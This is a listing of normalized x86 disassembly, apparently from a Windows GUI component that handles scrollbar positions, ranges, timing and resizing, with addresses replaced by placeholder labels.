mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4585f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_43c2a4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_43c47e ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43c1ac
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43c1ac
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43c61c
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov edi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
push ebp
call sub_43c244
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ebx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ebx
mov [ ebp - 0xc ] eax
mov edi ebx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
push ebp
call sub_43c244
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call GetTickCount
mov ebx eax
mov esi ebx
sub esi [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x20 ]
jae r-xdata
xor edi edi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
sub eax esi
push eax
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
dec edi
test edi edi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c61c
jmp r-xdata
sub_43c5a4
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_43cc9c
test esi esi
jne r-xdata
movzx eax [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_43c61c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_4585f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_4585f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_4581a4
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_4581a4
jmp r-xdata
xor edx edx
call sub_43bd90
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x298 ] 0x0
je r-xdata
mov eax [ eax + 0x298 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_43c6e0
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_43cc9c
test esi esi
jne r-xdata
movzx eax [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_43c79c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4585f8
push eax
call sub_431c98
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4585f8
push eax
call sub_431c98
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4585f8
push eax
call sub_431c98
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_424230
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4585f8
push eax
call sub_431c98
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4585f8
push eax
call sub_431c98
sub_43c8a4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
movzx ecx [ ebp - 0x6 ]
movzx edx [ ebp - 0x5 ]
mov eax [ esi ]
call sub_43c1ac
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
movzx ecx [ ebp - 0x6 ]
movzx edx [ ebp - 0x5 ]
mov eax [ esi ]
call sub_43c1ac
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
movzx eax [ eax + 0x44 ]
call sub_43c79c
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4585f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_43c61c
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_43c1ac
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_43c9c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_453534
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43be20
mov [ esi + 0x250 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43be20
mov [ esi + 0x254 ] eax
mov [ esi + 0x258 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_43ca38
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x250 ]
call sub_404650
mov eax [ esi + 0x254 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax esi
call sub_453678
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_43ca84
push ebx
mov ebx eax
mov eax ebx
call sub_454934
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_43cc9c
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40e384
test al al
jne r-xdata
mov eax ebx
call sub_4585f8
push eax
call sub_431ccc
sub_43cac4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_43cc1c
mov ecx edi
mov edx esi
mov eax ebx
call sub_45406c
pop edi
pop esi
pop ebx
retn
sub_43cb04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43cc0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_450210
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x250 ]
mov eax ebx
call sub_43c0c4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_4546e8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_43c61c
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4546ac
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4546ac
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_419740
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_44ff24
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cc13
mov eax [ ebp - 0x10 ]
call sub_404650
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_43bf04
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_419898
xor ecx ecx
mov edx 0xb03e
call sub_451b4c
inc ebx
dec esi
jne r-xdata
sub_43cc40
push ebx
mov ebx eax
cmp dl [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x250 ]
call sub_43c76c
xor edx edx
mov eax [ ebx + 0x254 ]
call sub_43c76c
mov eax ebx
call sub_43cc1c
jmp r-xdata
sub_43cc9c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x260 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_458904
test al al
je r-xdata
xor eax eax
push ebp
push sub_43cd87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x260 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_43c22c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_43c22c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov cl 0x1
xor edx edx
call sub_43c8a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
xor ecx ecx
mov dl 0x1
call sub_43c8a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
xor ecx ecx
xor edx edx
call sub_43c8a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
xor ecx ecx
mov dl 0x1
call sub_43c8a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
mov cl 0x1
xor edx edx
call sub_43c8a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
xor ecx ecx
mov dl 0x1
call sub_43c8a4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x260 ] 0x0
retn
sub_43cdac
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x250 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x254 ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_450324
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4503d4
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_450324
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4503d4
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_450210
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x250 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_43c61c
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_450210
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_450254
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x254 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_43c61c
jmp r-xdata
mov esi [ ebx + 0x250 ]
mov eax ebx
call sub_450210
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_43c61c
mov eax ebx
call sub_450210
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_450254
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x254 ]
mov eax ebx
call sub_450254
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_43c61c
mov eax ebx
call sub_450254
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_43cf00
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x250 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x254 ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x250 ]
call sub_43c61c
xor edx edx
mov eax [ ebx + 0x254 ]
call sub_43c61c
cmp [ ebx + 0x258 ] 0x0
jne r-xdata
mov eax [ ebx + 0x250 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x254 ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x250 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x254 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_43c76c
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_43c76c
sub_43cfa4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43cf00
mov ecx edi
mov edx esi
mov eax ebx
call sub_4580f8
pop edi
pop esi
pop ebx
retn
sub_43cfcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x25c ]
xor edx edx
push ebp
push sub_43d038
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_456a48
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d03f
mov eax [ ebp - 0x4 ]
dec [ eax + 0x25c ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_43d03f
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x260 ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x260 ] 0x1
xor eax eax
push ebp
push sub_43d087
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43cc1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d08e
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x260 ] dl
retn
sub_43d08e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43cc9c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43d104
push ebx
push esi
push edi
add esp 0xffffffec
mov [ esp ] edx
mov ebx eax
mov eax ebx
call sub_450210
mov edx [ ebx + 0x250 ]
mov edx [ edx + 0x10 ]
cmp eax edx
jge r-xdata
mov esi eax
mov esi edx
jmp r-xdata
mov edi edx
mov edi eax
jmp r-xdata
mov eax ebx
call sub_450254
mov edx [ ebx + 0x254 ]
mov edx [ edx + 0x10 ]
cmp eax edx
jle r-xdata
push edi
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x254 ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ ebx + 0x250 ]
mov eax [ eax + 0xc ]
neg eax
mov ecx esi
call sub_418470
mov eax [ esp ]
lea esi [ esp + 0x4 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ esp ]
mov eax ebx
call sub_4538a4
add esp 0x14
pop edi
pop esi
pop ebx
retn
sub_43d184
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43d1e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4047dc
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_457944
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d1ec
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_43d214
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d378
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_43d358
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xf0 ]
mov eax [ ebp - 0x4 ]
call sub_404528
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_404974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d35f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x358 ] 0x1
xor eax eax
push ebp
push sub_43d320
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_419658
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_404530
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
sub_43d3a0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x27c ] 0x0
jne r-xdata
test [ ebx + 0x358 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb0
call sub_40484c
and [ ebx + 0x358 ] 0xdf
sub_43d3d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0xc
call sub_402ee8
mov [ ebx + 0x2a4 ] eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_43c9c0
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_4435b0
xor edx edx
mov eax ebx
call sub_4435ec
mov edx 0x140
mov eax ebx
call sub_44ff8c
mov edx 0xf0
mov eax ebx
call sub_44ffc0
mov dl 0x1
mov eax [ r-xdata ]
call sub_42aec8
mov esi eax
mov [ ebx + 0x288 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
